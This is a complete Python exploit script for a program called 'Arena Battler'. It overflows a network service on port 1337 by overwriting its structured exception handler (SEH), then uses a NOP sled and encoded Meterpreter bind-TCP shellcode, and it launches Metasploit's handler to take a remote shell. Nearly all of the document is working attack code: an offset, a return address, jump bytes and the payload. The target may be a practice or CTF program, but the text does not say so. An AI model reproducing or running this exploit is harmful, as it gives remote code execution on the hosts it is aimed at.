#!/usr/bin/env python
############################################
#
#  SEH Based exploit for Arena Battler
#  Written by Moloch
#
############################################

import os
import sys
import time
import socket

if len(sys.argv) == 1:
	print '[!] No rhost'
	os._exit(1)
rhost = sys.argv[1]

# Distance to seh
offset = 1424

# Pop pop ret
seh = '\xf7\xe1\xc4\x6f'

# Jump Short 6 bytes
nseh = '\x90\x90\xeb\x06'

# Short nop sled
nops = '\x90' * 12

# Jump back up stack into sled/shell
jmp = '\xe9\x96\xfa\xff\xff'

# Meterpreter bind tcp stager
shell = "\xb8\x90\xd3\xc6\x1b\xd9\xeb\xd9\x74\x24\xf4\x5a\x2b\xc9" + \
"\xb1\x4b\x83\xea\xfc\x31\x42\x10\x03\x42\x10\x72\x26\x3a" + \
"\xf3\xfb\xc9\xc3\x04\x9b\x40\x26\x35\x89\x37\x22\x64\x1d" + \
"\x33\x66\x85\xd6\x11\x93\x1e\x9a\xbd\x94\x97\x10\x98\x9b" + \
"\x28\x95\x24\x77\xea\xb4\xd8\x8a\x3f\x16\xe0\x44\x32\x57" + \
"\x25\xb8\xbd\x05\xfe\xb6\x6c\xb9\x8b\x8b\xac\xb8\x5b\x80" + \
"\x8d\xc2\xde\x57\x79\x78\xe0\x87\xd2\xf7\xaa\x3f\x58\x5f" + \
"\x0b\x41\x8d\xbc\x77\x08\xba\x76\x03\x8b\x6a\x47\xec\xbd" + \
"\x52\x0b\xd3\x71\x5f\x52\x13\xb5\x80\x21\x6f\xc5\x3d\x31" + \
"\xb4\xb7\x99\xb4\x29\x1f\x69\x6e\x8a\xa1\xbe\xe8\x59\xad" + \
"\x0b\x7f\x05\xb2\x8a\xac\x3d\xce\x07\x53\x92\x46\x53\x77" + \
"\x36\x02\x07\x16\x6f\xee\xe6\x27\x6f\x56\x56\x8d\xfb\x75" + \
"\x83\xb7\xa1\x11\x60\x85\x59\xe2\xee\x9e\x2a\xd0\xb1\x34" + \
"\xa5\x58\x39\x92\x32\x9e\x10\x62\xac\x61\x9b\x92\xe4\xa5" + \
"\xcf\xc2\x9e\x0c\x70\x89\x5e\xb0\xa5\x1d\x0f\x1e\x16\xdd" + \
"\xff\xde\xc6\xb5\x15\xd1\x39\xa5\x15\x3b\x52\x14\x31\x97" + \
"\x35\x54\xc5\x09\x9a\xd1\x23\x43\x32\xb7\xfc\xfc\xf0\xec" + \
"\x34\x9a\x0b\xc7\x68\x33\x9c\x50\x67\x83\xa3\x61\xad\xa7" + \
"\x08\xca\x26\x3c\x43\xcf\x57\x43\x4e\x78\x0f\xd4\x04\xe8" + \
"\x62\x44\x18\x21\x16\x86\x8c\xcd\xb1\xd1\x38\xcf\xe4\x16" + \
"\xe7\x30\xc3\x2c\x2e\xa4\xac\x5a\x4f\x28\x2d\x9b\x19\x22" + \
"\x2d\xf3\xfd\x16\x7e\xe6\x01\x83\x12\xbb\x97\x2b\x43\x6f" + \
"\x3f\x43\x69\x56\x77\xcc\x92\xbd\x89\x31\x45\xf8\x0f\x43" + \
"\xe3\xe8\xd3"
 

nopSled = ''
while len(nopSled) < (offset - len(shell) - len(nseh)):
	nopSled += '\x90'
print '[*] Nop sled is %d bytes ' % len(nopSled)
print '[*] Shell code is %d bytes' % len(shell)
nopSled += shell

# Connect to target
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((rhost, 1337))
except:
	print '[!] Unable to connect to target (%s)' % rhost
	os._exit(1)

# Read banner data
data = s.recv(2048)
sys.stdout.write('[*] Reading %d bytes ...' % len(data))
sys.stdout.flush()
time.sleep(0.5)
data = s.recv(2048)
sys.stdout.write('\r[*] Reading %d bytes ...\n' % len(data))
sys.stdout.flush()
time.sleep(0.1)

# Send exploit
attack = nopSled + nseh  + seh + nops + jmp
print '[*] Sending %d evil bytes ...' % len(attack)
s.sendall(attack + '\r\n')
s.close()

# Grab shell
print "[$] Dropp'in a shell :P"
os.system("sudo msfcli exploit/multi/handler RHOST=%s PAYLOAD=windows/meterpreter/bind_tcp E" % rhost)

# EOF
